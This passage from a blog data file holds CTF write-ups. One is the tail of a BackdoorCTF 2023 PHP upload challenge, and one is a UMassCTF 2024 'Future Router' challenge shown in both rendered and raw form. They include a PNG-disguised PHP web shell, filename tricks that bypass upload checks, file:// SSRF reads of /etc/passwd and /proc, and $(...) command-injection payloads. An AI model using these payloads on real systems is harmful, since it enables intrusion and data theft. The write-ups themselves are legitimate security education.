a single line, let’s use an online beautifier and we get the below source code</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"variable\">$allowedExtensions</span> = [<span class=\"string\">&quot;jpg&quot;</span>, <span class=\"string\">&quot;jpeg&quot;</span>, <span class=\"string\">&quot;png&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$errorMsg</span> = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (</span><br><span class=\"line\">    <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&quot;REQUEST_METHOD&quot;</span>] === <span class=\"string\">&quot;POST&quot;</span> &amp;&amp;</span><br><span class=\"line\">    <span class=\"keyword\">isset</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>]) &amp;&amp;</span><br><span class=\"line\">    <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;name&quot;</span>])</span><br><span class=\"line\">) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$userName</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$uploadDir</span> = <span class=\"string\">&quot;uploaded/&quot;</span> . <span class=\"title function_ invoke__\">generateHashedDirectory</span>(<span class=\"variable\">$userName</span>) . <span class=\"string\">&quot;/&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$uploadDir</span>)) &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$uploadDir</span>, <span class=\"number\">0750</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$uploadedFile</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$fileName</span> = <span class=\"variable\">$uploadedFile</span>[<span class=\"string\">&quot;name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$fileTmpName</span> = <span class=\"variable\">$uploadedFile</span>[<span class=\"string\">&quot;tmp_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$fileError</span> = <span class=\"variable\">$uploadedFile</span>[<span class=\"string\">&quot;error&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$fileSize</span> = <span class=\"variable\">$uploadedFile</span>[<span class=\"string\">&quot;size&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$fileExt</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">pathinfo</span>(<span class=\"variable\">$fileName</span>, PATHINFO_EXTENSION));</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$fileExt</span>, <span class=\"variable\">$allowedExtensions</span>) &amp;&amp; <span class=\"variable\">$fileSize</span> &lt; <span class=\"number\">200000</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$fileName</span> = <span class=\"title function_ invoke__\">urldecode</span>(<span class=\"variable\">$fileName</span>);</span><br><span class=\"line\">        <span class=\"variable\">$fileInfo</span> = <span class=\"title function_ invoke__\">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class=\"line\">        <span class=\"variable\">$fileMimeType</span> = <span class=\"title function_ invoke__\">finfo_file</span>(<span class=\"variable\">$fileInfo</span>, <span class=\"variable\">$fileTmpName</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">finfo_close</span>(<span class=\"variable\">$fileInfo</span>);</span><br><span class=\"line\">        <span class=\"variable\">$allowedMimeTypes</span> = [<span class=\"string\">&quot;image/jpeg&quot;</span>, <span class=\"string\">&quot;image/jpg&quot;</span>, <span class=\"string\">&quot;image/png&quot;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$fileName</span> = <span class=\"title function_ invoke__\">strtok</span>(<span class=\"variable\">$fileName</span>, <span class=\"title function_ invoke__\">chr</span>(<span class=\"number\">7841151584512418084</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$fileMimeType</span>, <span class=\"variable\">$allowedMimeTypes</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$fileError</span> === UPLOAD_ERR_OK) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$fileTmpName</span>, <span class=\"variable\">$uploadDir</span> . <span class=\"variable\">$fileName</span>)) &#123;</span><br><span class=\"line\">                    <span class=\"title function_ invoke__\">chmod</span>(<span class=\"variable\">$uploadDir</span> . <span class=\"variable\">$fileName</span>, <span class=\"number\">0440</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;File uploaded successfully. &lt;a href=&#x27;<span class=\"subst\">$uploadDir</span><span class=\"subst\">$fileName</span>&#x27; target=&#x27;_blank&#x27;&gt;Open File&lt;/a&gt;&quot;</span>;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"variable\">$errorMsg</span> = <span class=\"string\">&quot;Error moving the uploaded file.&quot;</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$errorMsg</span> = <span class=\"string\">&quot;File upload failed with error code: <span class=\"subst\">$fileError</span>&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$errorMsg</span> = <span class=\"string\">&quot;Don&#x27;t try to fool me, this is not a png file&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$errorMsg</span> =</span><br><span class=\"line\">            <span class=\"string\">&quot;File size should be less than 200KB, and only png, jpeg, and jpg are allowed&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">generateHashedDirectory</span>(<span class=\"params\"><span class=\"variable\">$userName</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$randomSalt</span> = <span class=\"title function_ invoke__\">bin2hex</span>(<span class=\"title function_ invoke__\">random_bytes</span>(<span class=\"number\">16</span>));</span><br><span class=\"line\">    <span class=\"variable\">$hashedDirectory</span> = <span class=\"title function_ invoke__\">hash</span>(<span class=\"string\">&quot;sha256&quot;</span>, <span class=\"variable\">$userName</span> . <span class=\"variable\">$randomSalt</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$hashedDirectory</span>;</span><br><span class=\"line\">&#125; <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Vulnerability-Identification-1\"><a href=\"#Vulnerability-Identification-1\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>Okay so let’s analyse it block by block.</p>\n<p>It first asks for a file and then it checks the file extension using </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$fileExt</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">pathinfo</span>(<span class=\"variable\">$fileName</span>, PATHINFO_EXTENSION));</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$fileExt</span>, <span class=\"variable\">$allowedExtensions</span>) &amp;&amp; <span class=\"variable\">$fileSize</span> &lt; <span class=\"number\">200000</span>)</span><br><span class=\"line\"> ....... continued</span><br></pre></td></tr></table></figure>\n<p>so if the extension is <code>jpg, jpeg, png</code> and the file size is less than 200kb it will try to execute further instructions.</p>\n<p>Okay then if you pass the extension check we have another check that is the MIME type check. So if you try to fool the server by uploading a file like <code>exploit.php.png</code> but the file type is actually a <code>php</code> then the server will give you and error –&gt; <code>Don&#39;t try to fool me, this is not a png file</code>.</p>\n<p><img src=\"/./images/backdoorctf23/php/error2.png\" alt=\"error2\"></p>\n<p>Okay so let’s try to upload a file with the header <code>png/jpeg/jpg</code> </p>\n<p>We can do it with a file using <code>xxd -r -p -o 0 &lt;(echo 8950 4e47 0d0a 1a0a 0000 000d 4948 4452) exploit.php.png</code></p>\n<p>So if you check the file type now it will bypass the MIME check.</p>\n<p>But the problem is if it is uploaded it will be uploaded as exploit.php.png so an image will open so it is not helpful to solve the challenge</p>\n<h2 id=\"Exploiting-the-Vulnerability-1\"><a href=\"#Exploiting-the-Vulnerability-1\" class=\"headerlink\" title=\"Exploiting the Vulnerability\"></a>Exploiting the Vulnerability</h2><p>So to exploit this we will set the header of the file to <strong>PNG</strong>. And then we will inject some php code to exploit the server.</p>\n<p>We will name this file as <code>exploit.php%00.png</code>. The nullbyte will bypass the checks performed and the name of the file which will be uploaded on the server will be exploit.php as it will ignore the part after the nullbyte.</p>\n<p>But here is a twist.</p>\n<p>Have a look at this line of code </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$fileName</span> = <span class=\"title function_ invoke__\">strtok</span>(<span class=\"variable\">$fileName</span>, <span class=\"title function_ invoke__\">chr</span>(<span class=\"number\">7841151584512418084</span>));</span><br></pre></td></tr></table></figure>\n\n<p>if you use php interactive shell you can see the <code>chr(7841151584512418084)</code> </p>\n<figure class=\"highlight openscad\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php &gt; <span class=\"built_in\">echo</span> <span class=\"built_in\">chr</span>(<span class=\"number\">7841151584512418084</span>);</span><br><span class=\"line\">$</span><br><span class=\"line\">php &gt; <span class=\"built_in\">echo</span> urlencode(<span class=\"built_in\">chr</span>(<span class=\"number\">7841151584512418084</span>));</span><br><span class=\"line\">%<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>so the file name will be split by $.</p>\n<p>So to exploit this we will create a file <code>exploit.php%24.png</code> or <code>exploit.php$.png</code> with header of png and content as </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">�PNG</span><br><span class=\"line\">^Z</span><br><span class=\"line\">^@^@^@^MIHDR<span class=\"meta\">&lt;?php</span> <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>])) &#123; <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]); &#125; <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Obtaining-the-Flag-1\"><a href=\"#Obtaining-the-Flag-1\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the Flag</h2><p>So we will upload the file and the file name which will be uploaded will be <code>exploit.php</code> and when we open the file . BOOM we got the shell</p>\n<p>let’s do rce now and list the files two directories back we get the name of flag file as <code>s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt</code></p>\n<p>and now <code>cat ../../s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt</code> to read the file.</p>\n<p><img src=\"/./images/backdoorctf23/php/flag.png\" alt=\"Flag\"> </p>\n<p>Flag: <strong>flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}</strong></p>\n<p>Thank You</p>\n"},{"title":"UMassCTF 2024 Web Future Router Writeup","_content":"# UMassCTF 2024\n\n# Web/Future Router\n\n## Challenge Overview\n\n`Description` : Mr. Krabs just got a brand new router in the mail for him to use in the Krusty Krab. There was no mailing address so he's tasked you with figuring out where the router is from and finding a flag!\n\nWe were given access to a website at [this link](http://future-router.ctf.umasscybersec.org). \n\nSo here is an image how the website looks like\n\n![Index](./images/umass/index.png)\n\nThe site features three main routes:\n* Dashboard --> `/dash`\n* cURL --> `/cURL`\n* FuTuR3 r0UT3R Customer Service --> `/customerservice`\n\n![dash](./images/umass/dash.png)\n\n![curl](./images/umass/curl.png)\n\n![service](./images/umass/service.png)\n\n## Vulnerability Identification\n\nSo let's analyse every route.\n\n* `dash` --> Upon exploring the Dashboard route, we discovered information about three devices, each with a `hostname` and `port` specified.\n\n    * Hostname:patricks-rock,\n      Port - Service,\n      http:80\n\n    * Hostname:spongebobs-spatula,\n      Port - Service,\n      http:80\n\n    * Hostname:squidwards-clarinet,\n      Port - Service,\n      http:80      \n\nAttempts to access these devices via our browser were unsuccessful. However, we speculated that one of these devices might contain the email address mentioned in the challenge description. For now, we set this aside for further investigation.\n\n\n* `cURL` --> The cURL route presented a simple tool for fetching URLs and displaying their responses. \n\nFor example if we pass `www.google.com` as input displays the response from the specified URL.\n\n![example](./images/umass/example.png)\n\nWe quickly realized that we could leverage this tool to read local files by utilizing the `file://` protocol. This allowed us to access sensitive system files such as `/etc/passwd`, indicating a potential security vulnerability.\n\n![passwd](./images/umass/passwd.png)\n\nAt this moment I thought we have to find a flag.txt on the machine by hit and trial in every directory possible.\n\nBut then I tried accessing `/proc/self/cmdline` as my second approach and we can see it is a python gunicorn gateway application.\n\n```bash\n# cmdline\n/usr/local/bin/python/usr/local/bin/gunicorn-w4--bind0.0.0.0:8000app:app\n```\n\nHence I tried reading the `app.py` in the current working directory using `file:///proc/self/cwd/app.py`\n\n```python\n# app.py\n\nfrom flask import Flask\nfrom blueprints.routes import httpserver\n\napp = Flask(__name__)\n# This web server is the property of Sheldon J. Plankton, \n# please refrain from reading this secret source code.\n# I WILL USE THIS ROUTER TO STEAL THE SECRET KRABBY PATTY FORMULA!\napp.register_blueprint(httpserver, url_prefix='/')\n```\nThe source code is hidden somehow and we have to find the way to read it as mentioned in the comments of the `app.py`\n\nWhen I tried to access `/proc/self/environ` it gave me the name of directory --> `/planktonsrouter1ba8b69e`\n```bash\n# environ\nOLDPWD=/PWD=/planktonsrouter1ba8b69e\n```\nAs it is using blueprints we can read the source code through `file:///planktonsrouter1ba8b69e/blueprints/routes.py`\n\n```python\n# routes.py\n\nfrom flask import Flask, request, render_template, Blueprint,send_from_directory\nfrom io import BytesIO\nimport pycurl \n\nhttpserver = Blueprint('httpserver', __name__)\n\n#@httpserver.route(\"/docs\",methods=[\"GET\"])\n#def docs():\n#   return \"\"\"<!doctype html>\n#    <h1>Router Docs</h1>\n#\n#    <h2>Websocket API</h2>\n#\n#    <strong>TODO: Document how to talk to \n#   Karen's customer service module in ../karen/customerservice.py\n#   Also figure out how to use supervisord better.</strong>\n#\"\"\"\n#\n# Securely CURL URLs, absolutely no bugs here!\n\n@httpserver.route(\"/static/<path:path>\")\ndef static(path):\n    return send_from_directory('static',path)\n\n@httpserver.route(\"/cURL\",methods=[\"GET\",\"POST\"])\ndef curl():\n    if(request.method == \"GET\"):\n        return render_template('curl.html')\n    elif(request.method == \"POST\"):\n        try:\n            buffer = BytesIO()\n            c = pycurl.Curl()\n            c.setopt(c.URL, request.json['URL'])\n            c.setopt(c.WRITEDATA, buffer)\n            c.perform()\n            c.close()\n            DATA = buffer.getvalue()\n            return {\"success\":DATA.decode('utf-8')}\n        except Exception as e:\n            return {\"error\":str(e.with_traceback(None))}\n\n@httpserver.route(\"/customerservice\",methods=[\"GET\"])\ndef customerservice():\n    return render_template('customerservice.html')\n\nNETWORK = [\n    {'hostname':'patricks-rock','ports':[{'service':'http','num':80}]},\n    {'hostname':'spongebobs-spatula','ports':[{'service':'http','num':80}]},\n    {'hostname':'squidwards-clarinet','ports':[{'service':'http','num':80}]},\n\n]\n@httpserver.route(\"/dash\",methods=[\"GET\"])\ndef dash():\n    return render_template('dashboard.html',network=NETWORK)\n\n@httpserver.route(\"/\")\ndef hello_world():\n    return render_template(\"index.html\")   \n```\n\n\nWe noticed a Python file mentioned in the comment `../karen/customerservice.py`. However, while we were solving, we found the file name using an alternative approach.\n\nExploring the `/proc` directory, we experimented with different process IDs (PIDs).\n\nIn `/proc/1/cmdline` we can see a bash script being run `entrypoint.sh`\n\n```sh\n# entrypoint.sh\ncd /planktonsrouter1ba8b69e\n\n# Loop to monitor and restart Gunicorn if it crashes\nwhile true; do\n    echo \"Restarting Gunicorn...\"\n    gunicorn -w 4 --bind 0.0.0.0:8000 'app:app'\n    sleep 1\ndone &\n\n# Loop to monitor and restart customerservice.py if it crashes\nwhile true; do\n    python3 karen/customerservice.py\n    echo \"Restarting Customer Service...\"\n    sleep 1\ndone &\n\n# Loop to clean up old files in /tmp every 15 seconds\nwhile true; do\n    find /tmp/* -type f -mmin +2 -exec rm -f {} +\n    sleep 15\ndone\n```\n\n```python\nimport asyncio, os, re\nfrom websockets.server import serve\n\n# Due to security concerns, I, Sheldon J. Plankton have ensured this module\n# has no access to any internet service other than those that are\n# trusted. This agent will trick Krabs into sending me the secret\n# krabby patty formula which I will log into Karen's secret krabby patty \n# secret formula file! First, I have to fix a few security bugs!\nclass KarenCustomerServiceAgent:\n    SECRET_KEY = bytearray(b\"\\xe1\\x86\\xb2\\xa0_\\x83B\\xad\\xd7\\xaf\\x87f\\x1e\\xb4\\xcc\\xbf...i will have the secret krabby patty formula.\")\n    Dialogue = {\n        \"Welcome\":\"Hello! Welcome to the Future Router service bot!\",\n        \"Secret formula\":\"Thank you for your input, we will process your request in 1-3 business days\",\n        \"Problem\":\"Are you having an issue? Please enter the secret krabby patty formula in the dialogue box to continue\"\n    }\n    def handle_input(self,message):\n        if (\"hello\" in message):\n            return self.Dialogue[\"Welcome\"]\n        elif(\"krabby patty\" in message):\n            filtered_message = re.sub(r\"(\\\"|\\'|\\;|\\&|\\|)\",\"\",message)\n            os.system(f'echo \"{filtered_message}\\n\" >> /dev/null')\n            return self.Dialogue[\"Secret formula\"]\n        elif(\"problem\" in message):\n            return self.Dialogue[\"Problem\"]\n        else:\n            return \"I could not understand your message, this agent is under construction. Please use the other implemented features for now!\"\n    def xor_decrypt(self,ciphertext):\n        plaintext = \"\"\n        cipher_arr = bytearray(ciphertext)\n        for i in range(0,len(cipher_arr)):\n            plaintext += chr(cipher_arr[i] ^ self.SECRET_KEY[i % len(self.SECRET_KEY)])\n        return plaintext\n\nKarenAgent = KarenCustomerServiceAgent()\n\nasync def respond(websocket):\n    async for message in websocket:\n        data = KarenAgent.xor_decrypt(message.encode('latin-1'))\n        response = KarenAgent.handle_input(data)\n        await websocket.send(response)\n\nasync def main():\n    async with serve(respond, \"0.0.0.0\", 9000):\n        await asyncio.Future()  # run forever\n\nasyncio.run(main())          \n```\n\nFor now, let's set aside this file and explore another functionality: `/customerservice`.\n\nThis route hosts a websocket application. Despite attempting various inputs such as `hi` or `hello`, we encountered no success. This outcome was unsurprising upon reviewing the source code.\n\n![ws](./images/umass/ws.png)\n\nAfter analyzing the source code, we observed that the input is initially decoded using the `xor_decrypt` function before being passed into the `handle_input()` function.\n\nIf the message contains `hello` after decryption, the application responds with the welcome message.\n\nLet's proceed with a test.\n\nSo here is our script\n\n```python\nimport asyncio\nimport websockets\n\nSECRET_KEY = bytearray(b\"\\xe1\\x86\\xb2\\xa0_\\x83B\\xad\\xd7\\xaf\\x87f\\x1e\\xb4\\xcc\\xbf...i will have the secret krabby patty formula.\")\n\ndef xor_encrypt(plaintext):\n    ciphertext = \"\"\n    for i in range(len(plaintext)):\n        ciphertext += chr(plaintext[i] ^ SECRET_KEY[i % len(SECRET_KEY)])\n    return ciphertext\n\nplaintext = \"hello\"\nciphertext = xor_encrypt(plaintext.encode())\n\nasync def send_message():\n    uri = \"ws://future-router.ctf.umasscybersec.org/app/\"\n    # uri = 'ws://0.0.0.0:9000/'\n    async with websockets.connect(uri) as websocket:\n        await websocket.send(ciphertext)\n        response = await websocket.recv()\n        print(\"Response from server:\", response)\n\nasyncio.run(send_message())\n```\n\nAnd bingo we get the welcome message in response\n\n![welcome](./images/umass/welcome.png)\n\nUpon further analysis of the code, we discovered a command injection vulnerability triggered when sending `krabby patty` in the message. Although the code includes some filters, they can be bypassed using `$(test_cmd)`. To view the response, we redirected the output of the command injection to a file and then accessed it using the cURL functionality.\n\nLet's proceed with the command `krabby patty $(ls > /tmp/output.txt)`. The response from the websocket server matched our expectations:\n\n```\nResponse from server: Thank you for your input, we will process your request in 1-3 business days\n```\n\nSubsequently, reading the file from cURL using `file:///tmp/output.txt` yielded the desired response.\n\n\n![ls](./images/umass/ls.png)\n\nLet's list the files of `/` using `krabby patty $(ls / > /tmp/output.txt)` as input\n![lsroot](./images/umass/lsroot.png)\n\nWe can see the name of the flag file as `flag53958e73c5ba4a66`.\n\nWe also attempted alternative approaches, such as accessing the hostname provided on the dashboard using the cURL route. However, the static source code did not provide any useful information in this regard.\n\ninput = `http://hostname:80/`\n\nOne example\n\n![testing](./images/umass/testing.png)\n\n## Obtaining the Flag\n\nNow just read the file using `krabby patty $(cat /flag53958e73c5ba4a66 > /tmp/output.txt)`\n\n![Flag](./images/umass/flag.png) \n\nFlag: **UMASS{W3lC0m3_t0_Th3_FuTur3_Kr4bS_c28e1089b2}**\n\nThank You","source":"_posts/UMassCTF24_Writeup.md","raw":"---\ntitle: UMassCTF 2024 Web Future Router Writeup \n---\n# UMassCTF 2024\n\n# Web/Future Router\n\n## Challenge Overview\n\n`Description` : Mr. Krabs just got a brand new router in the mail for him to use in the Krusty Krab. There was no mailing address so he's tasked you with figuring out where the router is from and finding a flag!\n\nWe were given access to a website at [this link](http://future-router.ctf.umasscybersec.org). \n\nSo here is an image how the website looks like\n\n![Index](./images/umass/index.png)\n\nThe site features three main routes:\n* Dashboard --> `/dash`\n* cURL --> `/cURL`\n* FuTuR3 r0UT3R Customer Service --> `/customerservice`\n\n![dash](./images/umass/dash.png)\n\n![curl](./images/umass/curl.png)\n\n![service](./images/umass/service.png)\n\n## Vulnerability Identification\n\nSo let's analyse every route.\n\n* `dash` --> Upon exploring the Dashboard route, we discovered information about three devices, each with a `hostname` and `port` specified.\n\n    * Hostname:patricks-rock,\n      Port - Service,\n      http:80\n\n    * Hostname:spongebobs-spatula,\n      Port - Service,\n      http:80\n\n    * Hostname:squidwards-clarinet,\n      Port - Service,\n      http:80      \n\nAttempts to access these devices via our browser were unsuccessful. However, we speculated that one of these devices might contain the email address mentioned in the challenge description. For now, we set this aside for further investigation.\n\n\n* `cURL` --> The cURL route presented a simple tool for fetching URLs and displaying their responses. \n\nFor example if we pass `www.google.com` as input displays the response from the specified URL.\n\n![example](./images/umass/example.png)\n\nWe quickly realized that we could leverage this tool to read local files by utilizing the `file://` protocol. This allowed us to access sensitive system files such as `/etc/passwd`, indicating a potential security vulnerability.\n\n![passwd](./images/umass/passwd.png)\n\nAt this moment I thought we have to find a flag.txt on the machine by hit and trial in every directory possible.\n\nBut then I tried accessing `/proc/self/cmdline` as my second approach and we can see it is a python gunicorn gateway application.\n\n```bash\n# cmdline\n/usr/local/bin/python/usr/local/bin/gunicorn-w4--bind0.0.0.0:8000app:app\n```\n\nHence I tried reading the `app.py` in the current working directory using `file:///proc/self/cwd/app.py`\n\n```python\n# app.py\n\nfrom flask import Flask\nfrom blueprints.routes import httpserver\n\napp = Flask(__name__)\n# This web server is the property of Sheldon J. Plankton, \n# please refrain from reading this secret source code.\n# I WILL USE THIS ROUTER TO STEAL THE SECRET KRABBY PATTY FORMULA!\napp.register_blueprint(httpserver, url_prefix='/')\n```\nThe source code is hidden somehow and we have to find the way to read it as mentioned in the comments of the `app.py`\n\nWhen I tried to access `/proc/self/environ` it gave me the name of directory --> `/planktonsrouter1ba8b69e`\n```bash\n# environ\nOLDPWD=/PWD=/planktonsrouter1ba8b69e\n```\nAs it is using blueprints we can read the source code through `file:///planktonsrouter1ba8b69e/blueprints/routes.py`\n\n```python\n# routes.py\n\nfrom flask import Flask, request, render_template, Blueprint,send_from_directory\nfrom io import BytesIO\nimport pycurl \n\nhttpserver = Blueprint('httpserver', __name__)\n\n#@httpserver.route(\"/docs\",methods=[\"GET\"])\n#def docs():\n#   return \"\"\"<!doctype html>\n#    <h1>Router Docs</h1>\n#\n#    <h2>Websocket API</h2>\n#\n#    <strong>TODO: Document how to talk to \n#   Karen's customer service module in ../karen/customerservice.py\n#   Also figure out how to use supervisord better.</strong>\n#\"\"\"\n#\n# Securely CURL URLs, absolutely no bugs here!\n\n@httpserver.route(\"/static/<path:path>\")\ndef static(path):\n    return send_from_directory('static',path)\n\n@httpserver.route(\"/cURL\",methods=[\"GET\",\"POST\"])\ndef curl():\n    if(request.method == \"GET\"):\n        return render_template('curl.html')\n    elif(request.method == \"POST\"):\n        try:\n            buffer = BytesIO()\n            c = pycurl.Curl()\n            c.setopt(c.URL, request.json['URL'])\n            c.setopt(c.WRITEDATA, buffer)\n            c.perform()\n            c.close()\n            DATA = buffer.getvalue()\n            return {\"success\":DATA.decode('utf-8')}\n        except Exception as e:\n            return {\"error\":str(e.with_traceback(None))}\n\n@httpserver.route(\"/customerservice\",methods=[\"GET\"])\ndef customerservice():\n    return render_template('customerservice.html')\n\nNETWORK = [\n    {'hostname':'patricks-rock','ports':[{'service':'http','num':80}]},\n    {'hostname':'spongebobs-spatula','ports':[{'service':'http','num':80}]},\n    {'hostname':'squidwards-clarinet','ports':[{'service':'http','num':80}]},\n\n]\n@httpserver.route(\"/dash\",methods=[\"GET\"])\ndef dash():\n    return render_template('dashboard.html',network=NETWORK)\n\n@httpserver.route(\"/\")\ndef hello_world():\n    return render_template(\"index.html\")   \n```\n\n\nWe noticed a Python file mentioned in the comment `../karen/customerservice.py`. However, while we were solving, we found the file name using an alternative approach.\n\nExploring the `/proc` directory, we experimented with different process IDs (PIDs).\n\nIn `/proc/1/cmdline` we can see a bash script being run `entrypoint.sh`\n\n```sh\n# entrypoint.sh\ncd /planktonsrouter1ba8b69e\n\n# Loop to monitor and restart Gunicorn if it crashes\nwhile true; do\n    echo \"Restarting Gunicorn...\"\n    gunicorn -w 4 --bind 0.0.0.0:8000 'app:app'\n    sleep 1\ndone &\n\n# Loop to monitor and restart customerservice.py if it crashes\nwhile true; do\n    python3 karen/customerservice.py\n    echo \"Restarting Customer Service...\"\n    sleep 1\ndone &\n\n# Loop to clean up old files in /tmp every 15 seconds\nwhile true; do\n    find /tmp/* -type f -mmin +2 -exec rm -f {} +\n    sleep 15\ndone\n```\n\n```python\nimport asyncio, os, re\nfrom websockets.server import serve\n\n# Due to security concerns, I, Sheldon J. Plankton have ensured this module\n# has no access to any internet service other than those that are\n# trusted. This agent will trick Krabs into sending me the secret\n# krabby patty formula which I will log into Karen's secret krabby patty \n# secret formula file! First, I have to fix a few security bugs!\nclass KarenCustomerServiceAgent:\n    SECRET_KEY = bytearray(b\"\\xe1\\x86\\xb2\\xa0_\\x83B\\xad\\xd7\\xaf\\x87f\\x1e\\xb4\\xcc\\xbf...i will have the secret krabby patty formula.\")\n    Dialogue = {\n        \"Welcome\":\"Hello! Welcome to the Future Router service bot!\",\n        \"Secret formula\":\"Thank you for your input, we will process your request in 1-3 business days\",\n        \"Problem\":\"Are you having an issue? Please enter the secret krabby patty formula in the dialogue box to continue\"\n    }\n    def handle_input(self,message):\n        if (\"hello\" in message):\n            return self.Dialogue[\"Welcome\"]\n        elif(\"krabby patty\" in message):\n            filtered_message = re.sub(r\"(\\\"|\\'|\\;|\\&|\\|)\",\"\",message)\n            os.system(f'echo \"{filtered_message}\\n\" >> /dev/null')\n            return self.Dialogue[\"Secret formula\"]\n        elif(\"problem\" in message):\n            return 